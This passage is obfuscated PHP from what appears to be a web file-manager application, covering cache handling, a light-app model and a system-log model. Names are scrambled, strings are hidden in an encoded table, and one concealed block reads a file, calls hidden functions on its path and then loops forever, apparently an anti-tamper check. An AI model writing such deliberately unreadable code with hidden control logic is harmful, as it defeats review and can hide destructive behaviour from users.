CacheLock::lock($A‹ÂÇøÖâ±); $E¯Ñù›—Î­ = self::init()->set($eÕÑ—âŠ, serialize($B¨À‹…ÙÎ), $eôÏùÌœ†); self::$memoryCache[$eÕÑ—âŠ] = $B¨À‹…ÙÎ; goto c®ÁÎ¬Í¼é; c®ÁÎ¬Í¼é: CacheLock::unlock($A‹ÂÇøÖâ±); return $E¯Ñù›—Î­; goto AÌ–ª¼õß; AÌ–ª¼õß: } public static function remove($b•ØĞÜ—¾) { goto fßÆÕƒ´¢; fßÆÕƒ´¢: $a»ìŒ¬ïæ… = self::key($b•ØĞÜ—¾); unset(self::$memoryCache[$a»ìŒ¬ïæ…]); self::clearTimeout(); goto eĞ®Ê£œ”; eĞ®Ê£œ”: CacheLock::lock($b•ØĞÜ—¾); $Fª…¥®«ø = self::init()->remove($a»ìŒ¬ïæ…); CacheLock::unlock($b•ØĞÜ—¾); goto eçÎÈÄÛ›; eçÎÈÄÛ›: return $Fª…¥®«ø; goto bØ‹Ìœ¶òÚ; bØ‹Ìœ¶òÚ: } public static function removeMemory($fƒéò…ˆÛÊ) { $cèŞ“Ê‚ = self::key($fƒéò…ˆÛÊ); unset(self::$memoryCache[$cèŞ“Ê‚]); } public static function clearMemory($AÚÜ÷ÓÅĞ™ = false) { if ($AÚÜ÷ÓÅĞ™) { $AÚÜ÷ÓÅĞ™ = self::key($AÚÜ÷ÓÅĞ™); unset(self::$memoryCache[$AÚÜ÷ÓÅĞ™]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[åÌÛ»ô¢‚ö™][785])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[åÌÛ»ô¢‚ö™][786])) { self::init()->clearTimeout(); } } } if (!isset($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][179]]) || !isset($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][787]])) { goto C±øÖäø¦’; bé¤—²ÃğÇ: $F£ìÀñµ±é = explode($_SERVER[åÌÛ»ô¢‚ö™][183], $Bççœ¹™á); if (count($F£ìÀñµ±é) < $_SERVER[åÌÛ»ô¢‚ö™][184]) { $Fó‰íä«Œ¹ = $_SERVER[åÌÛ»ô¢‚ö™][185]; $Fó‰íä«Œ¹(); } $Cî­¸Ş¢‰ = $_SERVER[åÌÛ»ô¢‚ö™][186]; goto aêš©öÙã; C±øÖäø¦’: $C±½ïÒ»¿— = $_SERVER[åÌÛ»ô¢‚ö™][180]; $e¼Î¢‹è»Ñ = $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]; $Bççœ¹™á = $C±½ïÒ»¿—($e¼Î¢‹è»Ñ); goto bé¤—²ÃğÇ; aêš©öÙã: $Cî­¸Ş¢‰($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]); $b¬×Ã•…³ê = 2; while ($b¬×Ã•…³ê > 1) { $aÔŸî›Šë = rawurlencode($b¬×Ã•…³ê . $_SERVER[åÌÛ»ô¢‚ö™][377]); } goto Eø¾‰ŠĞª¦; Eø¾‰ŠĞª¦: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FÇ¨‚øäË¡, $B‚Åàô¥ê) { $F‡›‹ƒ’î¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->cachePath = $FÇ¨‚øäË¡[$F‡›‹ƒ’î¥[75]]; $this->prefix = $F‡›‹ƒ’î¥[788]; $this->cacheTime = $B‚Åàô¥ê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($a¦÷¦ĞÀ²») { $C‹äÎ»¶à“ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¦÷¦ĞÀ²» = str_replace(array($C‹äÎ»¶à“[789], $C‹äÎ»¶à“[93], $C‹äÎ»¶à“[69]), $C‹äÎ»¶à“[790], $a¦÷¦ĞÀ²»); return $this->cachePath . $C‹äÎ»¶à“[791] . $a¦÷¦ĞÀ²» . $C‹äÎ»¶à“[792]; } public function set($eÒ›„¹šÅ, $Aùæ®”–Ãº, $EÚ¡¹İÚ§ = false) { $b³İÏåœ‚ê = $this->getFile($eÒ›„¹šÅ); if (file_put_contents($b³İÏåœ‚ê, $this->prefix . $Aùæ®”–Ãº, LOCK_EX)) { return !0; } @unlink($b³İÏåœ‚ê); return !1; } public function get($FÉéÑà¾Í¯) { $cÀ²Ï¸Áëã = $this->getFile($FÉéÑà¾Í¯); if (file_exists($cÀ²Ï¸Áëã) && filemtime($cÀ²Ï¸Áëã) < time() - $this->cacheTime) { @unlink($cÀ²Ï¸Áëã); return !1; } $aÇéŠ˜š–è = @file_get_contents($cÀ²Ï¸Áëã); return substr($aÇéŠ˜š–è, strlen($this->prefix)); } public function remove($D„àÄ…ğ¶‹) { $F‡Æ¸Ï¶ğÂ = $this->getFile($D„àÄ…ğ¶‹); return @unlink($F‡Æ¸Ï¶ğÂ); } public function deleteAll() { $bÊª™·–¯¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dßÕÔŠÆ÷Æ = scandir($this->cachePath); foreach ($dßÕÔŠÆ÷Æ as $cïµÍËœ) { $A‡Çôöˆ = $this->cachePath . $cïµÍËœ; if (strpos($A‡Çôöˆ, $bÊª™·–¯¼[792]) && strpos($A‡Çôöˆ, $bÊª™·–¯¼[793])) { @unlink($A‡Çôöˆ); } } } public function clearTimeout() { $cœôÆõ¹äã =& $_SERVER[åÌÛ»ô¢‚ö™]; $f²çÒš«‰¦ = scandir($this->cachePath); foreach ($f²çÒš«‰¦ as $aåç£‹¾Û‘) { $fğ†‰±±¼ = $this->cachePath . $aåç£‹¾Û‘; if (strpos($fğ†‰±±¼, $cœôÆõ¹äã[792]) && strpos($fğ†‰±±¼, $cœôÆõ¹äã[793]) && filemtime($fğ†‰±±¼) < time() - $this->cacheTime) { @unlink($fğ†‰±±¼); } } } } goto b¶çŒïÀö¦; f‚’ÒßïË: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x4c\x69\x67\x68\x74\x41\x70\x70"; public $modelType = "\123\x79\163\x74\x65\x6d\117\160\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\x6d\145", "\x67\162\x6f\x75\160", "\x64\145\163\x63", "\143\157\156\164\x65\156\x74"); public function listData($D¢„äĞõ‡¦ = false, $Añ¼ÜŠ»» = "\x6d\157\144\x69\x66\171\124\151\155\145", $Båò¤¹¹ô¨ = true) { return parent::listData($D¢„äĞõ‡¦, $Añ¼ÜŠ»», $Båò¤¹¹ô¨); } public function remove($BÏ‘ß‚ˆ¥…) { $bîèš¥’‡‰ = $this->findByName($BÏ‘ß‚ˆ¥…); if (!$bîèš¥’‡‰) { return !1; } return parent::remove($bîèš¥’‡‰[$_SERVER[åÌÛ»ô¢‚ö™][392]]); } public function add($Bñæƒëä™ˆ) { if ($this->findByName($Bñæƒëä™ˆ[$_SERVER[åÌÛ»ô¢‚ö™][28]])) { return !1; } return parent::insert($Bñæƒëä™ˆ); } public function update($bŒŞ›åÇˆ¤, $CğœÍñÎ­) { $eäÙ¶ˆöö¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DëâÆŠƒİª = $this->findByName($bŒŞ›åÇˆ¤); $aš’áë˜› = $this->findByName($CğœÍñÎ­[$eäÙ¶ˆöö¤[28]]); if (!$DëâÆŠƒİª || $aš’áë˜› && $aš’áë˜›[$eäÙ¶ˆöö¤[392]] != $DëâÆŠƒİª[$eäÙ¶ˆöö¤[392]]) { return !1; } return parent::update($DëâÆŠƒİª[$eäÙ¶ˆöö¤[392]], $CğœÍñÎ­); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\151\x6d\145", "\151\156\163\145\162\164", "\x66\165\x6e\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $DÏÍ®ÜéåŸ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($DÏÍ®ÜéåŸ[2440] => LNG($DÏÍ®ÜéåŸ[2441]), $DÏÍ®ÜéåŸ[2442] => LNG($DÏÍ®ÜéåŸ[2443]), $DÏÍ®ÜéåŸ[2077] => LNG($DÏÍ®ÜéåŸ[2444]), $DÏÍ®ÜéåŸ[2445] => LNG($DÏÍ®ÜéåŸ[2446]), $DÏÍ®ÜéåŸ[2447] => LNG($DÏÍ®ÜéåŸ[2448]), $DÏÍ®ÜéåŸ[2449] => LNG($DÏÍ®ÜéåŸ[2450]), $DÏÍ®ÜéåŸ[2451] => LNG($DÏÍ®ÜéåŸ[2452]), $DÏÍ®ÜéåŸ[2453] => LNG($DÏÍ®ÜéåŸ[2454]), $DÏÍ®ÜéåŸ[2455] => LNG($DÏÍ®ÜéåŸ[2456]), $DÏÍ®ÜéåŸ[2108] => LNG($DÏÍ®ÜéåŸ[2456]), $DÏÍ®ÜéåŸ[2109] => LNG($DÏÍ®ÜéåŸ[2457]), $DÏÍ®ÜéåŸ[2458] => LNG($DÏÍ®ÜéåŸ[2459]), $DÏÍ®ÜéåŸ[2460] => LNG($DÏÍ®ÜéåŸ[2461]), $DÏÍ®ÜéåŸ[2462] => LNG($DÏÍ®ÜéåŸ[2463]), $DÏÍ®ÜéåŸ[2464] => LNG($DÏÍ®ÜéåŸ[2465]), $DÏÍ®ÜéåŸ[2106] => LNG($DÏÍ®ÜéåŸ[2466]), $DÏÍ®ÜéåŸ[2113] => LNG($DÏÍ®ÜéåŸ[2467]), $DÏÍ®ÜéåŸ[2468] => LNG($DÏÍ®ÜéåŸ[2469]), $DÏÍ®ÜéåŸ[2470] => LNG($DÏÍ®ÜéåŸ[2471]), $DÏÍ®ÜéåŸ[2472] => LNG($DÏÍ®ÜéåŸ[2473]), $DÏÍ®ÜéåŸ[2474] => LNG($DÏÍ®ÜéåŸ[2475]), $DÏÍ®ÜéåŸ[2116] => LNG($DÏÍ®ÜéåŸ[2476]), $DÏÍ®ÜéåŸ[2117] => LNG($DÏÍ®ÜéåŸ[2477]), $DÏÍ®ÜéåŸ[2478] => LNG($DÏÍ®ÜéåŸ[2479]), $DÏÍ®ÜéåŸ[2480] => LNG($DÏÍ®ÜéåŸ[2481]), $DÏÍ®ÜéåŸ[2482] => LNG($DÏÍ®ÜéåŸ[2483]), $DÏÍ®ÜéåŸ[2111] => LNG($DÏÍ®ÜéåŸ[2484]), $DÏÍ®ÜéåŸ[2485] => LNG($DÏÍ®ÜéåŸ[2486]), $DÏÍ®ÜéåŸ[2110] => LNG($DÏÍ®ÜéåŸ[2487]), $DÏÍ®ÜéåŸ[2488] => LNG($DÏÍ®ÜéåŸ[2489]), $DÏÍ®ÜéåŸ[2490] => LNG($DÏÍ®ÜéåŸ[2491]), $DÏÍ®ÜéåŸ[2492] => LNG($DÏÍ®ÜéåŸ[2492]), $DÏÍ®ÜéåŸ[2493] => LNG($DÏÍ®ÜéåŸ[2081]), $DÏÍ®ÜéåŸ[2494] => LNG($DÏÍ®ÜéåŸ[2495]), $DÏÍ®ÜéåŸ[2496] => LNG($DÏÍ®ÜéåŸ[2497]), $DÏÍ®ÜéåŸ[2498] => LNG($DÏÍ®ÜéåŸ[2499]), $DÏÍ®ÜéåŸ[2500] => LNG($DÏÍ®ÜéåŸ[2501]), $DÏÍ®ÜéåŸ[2502] => LNG($DÏÍ®ÜéåŸ[2503]), $DÏÍ®ÜéåŸ[2504] => LNG($DÏÍ®ÜéåŸ[2504]), $DÏÍ®ÜéåŸ[2505] => LNG($DÏÍ®ÜéåŸ[2506]), $DÏÍ®ÜéåŸ[2507] => LNG($DÏÍ®ÜéåŸ[2508]), $DÏÍ®ÜéåŸ[2509] => LNG($DÏÍ®ÜéåŸ[2510]), $DÏÍ®ÜéåŸ[2511] => LNG($DÏÍ®ÜéåŸ[2512]), $DÏÍ®ÜéåŸ[2513] => LNG($DÏÍ®ÜéåŸ[2514]), $DÏÍ®ÜéåŸ[2515] => LNG($DÏÍ®ÜéåŸ[2516])); } private function typeFile() { $aöÃÆÈ¬Ä =& $_SERVER[åÌÛ»ô¢‚ö™]; $BôÕÖ‚òÚ… = array($aöÃÆÈ¬Ä[2113] => array($aöÃÆÈ¬Ä[2114]), $aöÃÆÈ¬Ä[2462] => array($aöÃÆÈ¬Ä[2517]), $aöÃÆÈ¬Ä[2464] => array($aöÃÆÈ¬Ä[2518]), $aöÃÆÈ¬Ä[2106] => array($aöÃÆÈ¬Ä[2107]), $aöÃÆÈ¬Ä[2470] => array(), $aöÃÆÈ¬Ä[2472] => array(), $aöÃÆÈ¬Ä[2474] => array(), $aöÃÆÈ¬Ä[2116] => array($aöÃÆÈ¬Ä[2118]), $aöÃÆÈ¬Ä[2117] => array($aöÃÆÈ¬Ä[2118]), $aöÃÆÈ¬Ä[2478] => array($aöÃÆÈ¬Ä[2519]), $aöÃÆÈ¬Ä[2480] => array($aöÃÆÈ¬Ä[2519]), $aöÃÆÈ¬Ä[2482] => array($aöÃÆÈ¬Ä[2520]), $aöÃÆÈ¬Ä[2468] => array($aöÃÆÈ¬Ä[2521]), $aöÃÆÈ¬Ä[2111] => array($aöÃÆÈ¬Ä[2522]), $aöÃÆÈ¬Ä[2485] => array($aöÃÆÈ¬Ä[2523]), $aöÃÆÈ¬Ä[2110] => array($aöÃÆÈ¬Ä[2112])); return $BôÕÖ‚òÚ…; } private function typeAll() { goto A”±ÙÛ‚ˆÑ; A”±ÙÛ‚ˆÑ: $a¿îÊêˆ© =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eâ—Ê£ø = $this->typeList; $Bæ§˜¤‘Ë = array_filter($this->typeFile()); goto eé„ËÅµÌ—; eé„ËÅµÌ—: foreach ($Bæ§˜¤‘Ë as $d®ñ„˜ç¦° => $aÎ¾·ÕİÒÔ) { $Eâ—Ê£ø[$aÎ¾·ÕİÒÔ[0]] = $Eâ—Ê£ø[$d®ñ„˜ç¦°]; } $Eâ—Ê£ø[$a¿îÊêˆ©[2118]] = LNG($a¿îÊêˆ©[2524]); $Eâ—Ê£ø[$a¿îÊêˆ©[2519]] = LNG($a¿îÊêˆ©[2525]); goto Fëµ˜ùÇ; Fëµ˜ùÇ: return $Eâ—Ê£ø; goto c¶Ë†¢–¿Õ; c¶Ë†¢–¿Õ: } public function addLog($f³ÔÄÛô†À, $AáÓšÎá = array()) { goto aŸ™ã¥ÒİÅ; aŸ™ã¥ÒİÅ: $b„Ïó¨Š¢– =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->typeList[$f³ÔÄÛô†À])) { return; } $fÌ—˜Ó÷Ì = defined($b„Ïó¨Š¢–[451]) && USER_ID ? USER_ID : (isset($AáÓšÎá[$b„Ïó¨Š¢–[1465]]) ? $AáÓšÎá[$b„Ïó¨Š¢–[1465]] : 0); goto bÂÒ£Áğğø; EŒŒœ±á…: $AáÓšÎá = array($b„Ïó¨Š¢–[1456] => Session::sign(), $b„Ïó¨Š¢–[1457] => $fÌ—˜Ó÷Ì, $b„Ïó¨Š¢–[29] => $f³ÔÄÛô†À, $b„Ïó¨Š¢–[1459] => json_encode($AáÓšÎá)); parent::add($AáÓšÎá); goto F¨Ì¸ğÚí; bÂÒ£Áğğø: if (!$fÌ—˜Ó÷Ì) { $fÌ—˜Ó÷Ì = (int) Session::get($b„Ïó¨Š¢–[2258]); } $böôê‰Ó“ = get_client_ip(); if (!$AáÓšÎá || strlen(json_encode($AáÓšÎá)) >= 1024) { $AáÓšÎá = array($b„Ïó¨Š¢–[2526] => $böôê‰Ó“); } else { if (is_array($AáÓšÎá)) { $AáÓšÎá[$b„Ïó¨Š¢–[2526]] = $böôê‰Ó“; } else { $AáÓšÎá = array($b„Ïó¨Š¢–[1061] => $AáÓšÎá, $b„Ïó¨Š¢–[2526] => $böôê‰Ó“); } } goto EŒŒœ±á…; F¨Ì¸ğÚí: } public function remove($dñæÚ‡ÏÂ“) { $this->where(array($_SERVER[åÌÛ»ô¢‚ö™][410] => $dñæÚ‡ÏÂ“))->delete(); } private function _makeOrder($A¬ÜÚË´„ = '') { goto B˜¶¼­ˆâƒ; Eà¶§“Ö: return $this->order($A¬ÜÚË´„); goto CŸÏ·‡ ‹; B˜¶¼­ˆâƒ: $A—¨‹Ë©Æô =& $_SERVER[åÌÛ»ô¢‚ö™]; $e°™¨ö­˜³ = $A—¨‹Ë©Æô[200]; $AÁ×ñëœ»ù = array($A—¨‹Ë©Æô[427] => $A—¨‹Ë©Æô[428], $A—¨‹Ë©Æô[429] => $A—¨‹Ë©Æô[430]); goto F¦˜ÎÏ™Õ½; F¦˜ÎÏ™Õ½: $d· ¬íñì = Input::get($A—¨‹Ë©Æô[433], $A—¨‹Ë©Æô[7], $A—¨‹Ë©Æô[2292], array($A—¨‹Ë©Æô[2218], $A—¨‹Ë©Æô[429])); $d· ¬íñì = $AÁ×ñëœ»ù[$d· ¬íñì]; $A¬ÜÚË´„ = $A¬ÜÚË´„ . "{$e°™¨ö­˜³}\40{$d· ¬íñì}"; goto Eà¶§“Ö; CŸÏ·‡ ‹: } public function get($CÊ—×ëØ…ß = '') { goto e„¬Âùó; cÆö†ñ»’î: if (!empty($CÊ—×ëØ…ß[$F“Ş‘¬™Á©[2526]])) { $e°”¶Á½‘¥[$F“Ş‘¬™Á©[430]] = array($F“Ş‘¬™Á©[382], "\x25{$CÊ—×ëØ…ß[$F“Ş‘¬™Á©[2526]]}\45"); } $AÛéµ˜ˆª = $this->_makeOrder()->where($e°”¶Á½‘¥)->selectPage(); if (empty($AÛéµ˜ˆª[$F“Ş‘¬™Á©[370]])) { show_json(array(), !0, $AÛéµ˜ˆª[$F“Ş‘¬™Á©[367]]); } goto d‰ëİÍ½; dÒ¹Ÿ°âŒ: if ($CÊ—×ëØ…ß[$F“Ş‘¬™Á©[1465]]) { $e°”¶Á½‘¥[$F“Ş‘¬™Á©[1465]] = $CÊ—×ëØ…ß[$F“Ş‘¬™Á©[1465]]; } if (isset($CÊ—×ëØ…ß[$F“Ş‘¬™Á©[729]])) { $BÒå•ñù• = $CÊ—×ëØ…ß[$F“Ş‘¬™Á©[729]]; $BáÁë½ŠâÂ = isset($CÊ—×ëØ…ß[$F“Ş‘¬™Á©[473]]) ? $CÊ—×ëØ…ß[$F“Ş‘¬™Á©[473]] : time(); $e°”¶Á½‘¥[$F“Ş‘¬™Á©[200]] = array($F“Ş‘¬™Á©[336], array($BÒå•ñù•, $BáÁë½ŠâÂ)); } if ($CÊ—×ëØ…ß[$F“Ş‘¬™Á©[29]]) { $b’…ë°Ë²‹ = explode($F“Ş‘¬™Á©[47], $CÊ—×ëØ…ß[$F“Ş‘¬™Á©[29]]); $EŞïÄÌÓ‚ = $this->typeFile(); $Dß‡ß›¨Õˆ = array(); foreach ($b’…ë°Ë²‹ as $FÎÁ÷‡¥ø¼) { $Dß‡ß›¨Õˆ[] = $FÎÁ÷‡¥ø¼; if (isset($EŞïÄÌÓ‚[$FÎÁ÷‡¥ø¼])) { $Dß‡ß›¨Õˆ = array_merge($Dß‡ß›¨Õˆ, $EŞïÄÌÓ‚[$FÎÁ÷‡¥ø¼]); } } $Dß‡ß›¨Õˆ = array_unique($Dß‡ß›¨Õˆ); if ($Dß‡ß›¨Õˆ) { $e°”¶Á½‘¥[$F“Ş‘¬™Á©[29]] = array($F“Ş‘¬™Á©[7], $Dß‡ß›¨Õˆ); } } goto cÆö†ñ»’î; e„¬Âùó: $F“Ş‘¬™Á© =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$CÊ—×ëØ…ß) { show_json(array()); } $e°”¶Á½‘¥ = array(); goto dÒ¹Ÿ°âŒ; d‰ëİÍ½: $AÛéµ˜ˆª[$F“Ş‘¬™Á©[370]] = $this->logList($AÛéµ˜ˆª[$F“Ş‘¬™Á©[370]]); return $AÛéµ˜ˆª; goto AÄÑ±¬Â; AÄÑ±¬Â: } private function ipAddress(&$dãõÑ›šĞˆ) { $Bº·³¸ç¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($dãõÑ›šĞˆ[$Bº·³¸ç¡[2526]])) { $D²ë¶¹°£° = IpLocation::get($dãõÑ›šĞˆ[$Bº·³¸ç¡[2526]]); } else { $D²ë¶¹°£° = LNG($Bº·³¸ç¡[2527]); } $dãõÑ›šĞˆ[$Bº·³¸ç¡[2528]] = $D²ë¶¹°£°; } private function descZipDownload($CÔ¦±åª¢Ô, &$e®°Á«ØÇÍ) { $E…¤ïèÉ† =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($CÔ¦±åª¢Ô[$E…¤ïèÉ†[2529]])) { return; } $A‰ß«Í÷•Ù = json_decode($CÔ¦±åª¢Ô[$E…¤ïèÉ†[2529]], !0); foreach ($A‰ß«Í÷•Ù as $bøØ’ãºÂÇ) { if (!IO::init($bøØ’ãºÂÇ[$E…¤ïèÉ†[75]])) { continue; } if (!($aòÓ¤‘áè© = IO::infoFull($bøØ’ãºÂÇ[$E…¤ïèÉ†[75]]))) { continue; } $CÔ¦±åª¢Ô[$E…¤ïèÉ†[75]] = $bøØ’ãºÂÇ[$E…¤ïèÉ†[75]]; $e®°Á«ØÇÍ[] = $CÔ¦±åª¢Ô[$E…¤ïèÉ†[394]] = $aòÓ¤‘áè©[$E…¤ïèÉ†[394]]; $e®°Á«ØÇÍ[] = $CÔ¦±åª¢Ô[$E…¤ïèÉ†[2347]] = $aòÓ¤‘áè©[$E…¤ïèÉ†[487]]; break; } return $CÔ¦±åª¢Ô; } private function getSourceList(&$F«Œ°‚˜‡) { $b†¢¸ÚÖâ× =& $_SERVER[åÌÛ»ô¢‚ö™]; $döÑŒÑ = array(); foreach ($F«Œ°‚˜‡ as $d—‡Ø»¬ŒÁ => $EŠ¼À›åµ) { goto FÉ¡ˆÖÍæÏ; F„§êÉ‡áî: if ($dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[29]] == $b†¢¸ÚÖâ×[2355]) { $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[430]][$b†¢¸ÚÖâ×[394]]; } goto CŒÈ¦Ëø¶‡; FÉ¡ˆÖÍæÏ: $dâÓ‹¼ªñï = json_decode($EŠ¼À›åµ[$b†¢¸ÚÖâ×[430]], !0); if ($EŠ¼À›åµ[$b†¢¸ÚÖâ×[29]] == $b†¢¸ÚÖâ×[2109]) { $dâÓ‹¼ªñï = $this->descZipDownload($dâÓ‹¼ªñï, $döÑŒÑ); $F«Œ°‚˜‡[$d—‡Ø»¬ŒÁ][$b†¢¸ÚÖâ×[430]] = json_encode($dâÓ‹¼ªñï); continue; } if (strpos($EŠ¼À›åµ[$b†¢¸ÚÖâ×[29]], $b†¢¸ÚÖâ×[2348]) !== 0) { goto FŸõåàğËè; FŸõåàğËè: if (!isset($dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[75]]) || strpos($EŠ¼À›åµ[$b†¢¸ÚÖâ×[29]], $b†¢¸ÚÖâ×[2530]) !== 0) { continue; } if (!IO::init($dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[75]])) { continue; } if (!($c¿…§İÍ¤è = IO::infoFull($dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[75]]))) { continue; } goto cï—Š‰±Ìô; cï—Š‰±Ìô: $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[394]] = $c¿…§İÍ¤è[$b†¢¸ÚÖâ×[394]]; $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[2347]] = $c¿…§İÍ¤è[$b†¢¸ÚÖâ×[487]]; $F«Œ°‚˜‡[$d—‡Ø»¬ŒÁ][$b†¢¸ÚÖâ×[430]] = json_encode($dâÓ‹¼ªñï); goto a©Èõ“±ğ½; a©Èõ“±ğ½: continue; goto DÈÉ¸¿Ê´; DÈÉ¸¿Ê´: } goto BÍâ”á×ß²; BÍâ”á×ß²: $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[394]]; $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[2347]]; if ($dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[29]] == $b†¢¸ÚÖâ×[518]) { $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[430]][$b†¢¸ÚÖâ×[1030]]; $döÑŒÑ[] = $dâÓ‹¼ªñï[$b†¢¸ÚÖâ×[430]][$b†¢¸ÚÖâ×[1031]]; } goto F„§êÉ‡áî; CŒÈ¦Ëø¶‡: } if (!$döÑŒÑ) { return array(); } return Model($b†¢¸ÚÖâ×[778])->sourceListInfo($döÑŒÑ, !0); } private function logList($DäŒ¯—¯£Í) { goto c¢ÛÙÌØ”‰; c¢ÛÙÌØ”‰: $Bßñ„Æå =& $_SERVER[åÌÛ»ô¢‚ö™]; $eö¼‹ŠÃµƒ = array_to_keyvalue($DäŒ¯—¯£Í, $Bßñ„Æå[33], $Bßñ„Æå[1465]); $f‡ÇÈŠòÁ = Model($Bßñ„Æå[503])->userListInfo(array_unique($eö¼‹ŠÃµƒ)); goto F½Í“™½ªÓ; F½Í“™½ªÓ: $D®–ºó‰¼ = $this->getSourceList($DäŒ¯—¯£Í); $aŒâÂÚßÍã = $this->typeAll(); $FÖ–†œ² = array(); goto FÅ¤íÀ…’„; FÅ¤íÀ…’„: $Aåµğ£‹Íµ = array(); foreach ($DäŒ¯—¯£Í as $DŞ«ÛäÈß => $E–­¯ÂíÁ‰) { goto eï„…ÁØç; bçÅªÔµ¨: $E–­¯ÂíÁ‰[$Bßñ„Æå[28]] = isset($C“ª¶‰ƒğÎ[$Bßñ„Æå[28]]) ? $C“ª¶‰ƒğÎ[$Bßñ„Æå[28]] : LNG($Bßñ„Æå[2527]); $E–­¯ÂíÁ‰[$Bßñ„Æå[2396]] = isset($C“ª¶‰ƒğÎ[$Bßñ„Æå[2396]]) ? $C“ª¶‰ƒğÎ[$Bßñ„Æå[2396]] : $Bßñ„Æå[33]; $E–­¯ÂíÁ‰[$Bßñ„Æå[1368]] = isset($aŒâÂÚßÍã[$BÂÈ“ ¨°]) ? $aŒâÂÚßÍã[$BÂÈ“ ¨°] : $EŞ„º·Š  ; goto a¿ƒ”ÕŠÖ‡; B³ØÎöÂÀÇ: $this->ipAddress($E–­¯ÂíÁ‰); if (strpos($BÂÈ“ ¨°, $Bßñ„Æå[2348]) === 0 || isset($B×“ïÒë±ê[$Bßñ„Æå[2347]])) { goto E—™¦Õ‹çç; C­õËøƒğõ: if ($B×“ïÒë±ê[$Bßñ„Æå[29]] == $Bßñ„Æå[2355]) { $B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[394]] = $D®–ºó‰¼[$B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[394]]]; } if ($B×“ïÒë±ê[$Bßñ„Æå[29]] == $Bßñ„Æå[2104]) { $B×“ïÒë±ê[$Bßñ„Æå[2360]] = $B×“ïÒë±ê[$Bßñ„Æå[416]]; $B×“ïÒë±ê[$Bßñ„Æå[2347]] = $B×“ïÒë±ê[$Bßñ„Æå[2360]][$Bßñ„Æå[394]]; $B×“ïÒë±ê[$Bßñ„Æå[416]] = !1; $B×“ïÒë±ê[$Bßñ„Æå[394]] = $Bßñ„Æå[33]; } if ($B×“ïÒë±ê[$Bßñ„Æå[416]] && $B×“ïÒë±ê[$Bßñ„Æå[416]][$Bßñ„Æå[396]] == $Bßñ„Æå[1106]) { $Aåµğ£‹Íµ[] = $E–­¯ÂíÁ‰[$Bßñ„Æå[392]]; unset($DäŒ¯—¯£Í[$DŞ«ÛäÈß]); continue; } goto D æÉŠ™ñö; E—™¦Õ‹çç: $B×“ïÒë±ê[$Bßñ„Æå[416]] = $D®–ºó‰¼[$B×“ïÒë±ê[$Bßñ„Æå[394]]]; $B×“ïÒë±ê[$Bßñ„Æå[2360]] = $D®–ºó‰¼[$B×“ïÒë±ê[$Bßñ„Æå[2347]]]; if ($B×“ïÒë±ê[$Bßñ„Æå[29]] == $Bßñ„Æå[518]) { $B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[1030]] = $D®–ºó‰¼[$B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[1030]]]; $B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[1031]] = $D®–ºó‰¼[$B×“ïÒë±ê[$Bßñ„Æå[430]][$Bßñ„Æå[1031]]]; } goto C­õËøƒğõ; D æÉŠ™ñö: if ($B×“ïÒë±ê[$Bßñ„Æå[2360]] && $B×“ïÒë±ê[$Bßñ„Æå[2360]][$Bßñ„Æå[396]] == $Bßñ„Æå[1106]) { $Aåµğ£‹Íµ[] = $E–­¯ÂíÁ‰[$Bßñ„Æå[392]]; unset($DäŒ¯—¯£Í[$DŞ«ÛäÈß]); continue; } goto eˆ¨Èº´ò; eˆ¨Èº´ò: } $E–­¯ÂíÁ‰[$Bßñ„Æå[430]] = $B×“ïÒë±ê; goto d™õ‘“¹Óè; a¿ƒ”ÕŠÖ‡: $E–­¯ÂíÁ‰[$Bßñ„Æå[2291]] = $C“ª¶‰ƒğÎ; $B×“ïÒë±ê = json_decode($E–­¯ÂíÁ‰[$Bßñ„Æå[430]], !0); $E–­¯ÂíÁ‰[$Bßñ„Æå[2526]] = isset($B×“ïÒë±ê[$Bßñ„Æå[2526]]) ? $B×“ïÒë±ê[$Bßñ„Æå[2526]] : $Bßñ„Æå[33]; goto 